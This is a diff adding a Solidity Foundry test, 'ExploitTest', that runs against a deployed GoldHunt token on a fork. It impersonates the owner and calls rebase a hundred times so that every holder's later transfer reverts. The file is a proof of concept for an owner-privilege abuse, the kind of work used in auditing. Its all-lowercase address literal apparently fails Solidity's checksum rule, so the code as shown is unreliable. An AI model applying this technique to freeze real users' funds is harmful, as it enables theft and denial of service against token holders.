@@ -1,0 +1,85 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+// ---------- Interfaces ----------
+interface IGoldHunt {
+    function owner() external view returns (address);
+    function rebaseMultiple() external view returns (uint256);
+    function rewardsPool() external view returns (address);
+    function pair() external view returns (address);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function setRewardsPool(address _rewardsPool) external;
+    function setPair(address _pair) external;
+    function rebase(uint256 multiple) external;
+}
+
+interface InterfaceLP {
+    function sync() external;
+}
+
+// ---------- Mock LP (to satisfy sync call) ----------
+contract MockLP {
+    function sync() external pure {}
+}
+
+// ---------- Main Exploit Test ----------
+contract ExploitTest is Test {
+    address constant TARGET = 0x6d3dd96f97b10fc86a7f8607704bbe9936083b89;
+    IGoldHunt token = IGoldHunt(TARGET);
+
+    address owner;
+    MockLP mockLP;
+    address user = address(this); // test contract acts as a user
+    address recipient = address(0x123);
+
+    uint256 constant INITIAL_REAL_AMOUNT = 1000 * 1e18; // real tokens to give user
+
+    function setUp() public {
+        // Get the current owner on the fork
+        owner = token.owner();
+        vm.label(owner, "Owner");
+
+        // Deploy a mock LP to avoid revert on sync()
+        mockLP = new MockLP();
+        vm.label(address(mockLP), "MockLP");
+
+        // Ensure rewardsPool is set (to any non-zero address)
+        vm.prank(owner);
+        token.setRewardsPool(address(mockLP));
+
+        // If pair is not already set, set it to the mock LP
+        if (token.pair() == address(0)) {
+            vm.prank(owner);
+            token.setPair(address(mockLP));
+        }
+
+        // Transfer some real tokens to user before the attack
+        // At this point rebaseMultiple is 1
+        vm.prank(owner);
+        token.transfer(user, INITIAL_REAL_AMOUNT);
+    }
+
+    function testTransactionHalt() public {
+        // ----- Attack: owner inflates rebaseMultiple -----
+        vm.startPrank(owner);
+        for (uint256 i = 0; i < 100; i++) {
+            // Each call doubles rebaseMultiple
+            token.rebase(2);
+        }
+        vm.stopPrank();
+
+        // At this point rebaseMultiple = 2^100 ≈ 1.27e30
+        // User's real balance = INITIAL_REAL_AMOUNT / 2^100 ≈ 0
+        // User's raw balance (_balances[user]) is still INITIAL_REAL_AMOUNT * 1 (since it was set when rebaseMultiple=1)
+        // Trying to transfer even 1 wei (real) will compute raw = 1 * 2^100 ≈ 1.27e30 > 1000e18
+        // => revert with "ERC20: transfer amount exceeds balance"
+
+        vm.expectRevert("ERC20: transfer amount exceeds balance");
+        token.transfer(recipient, 1); // 1 wei real amount
+    }
+}
+```
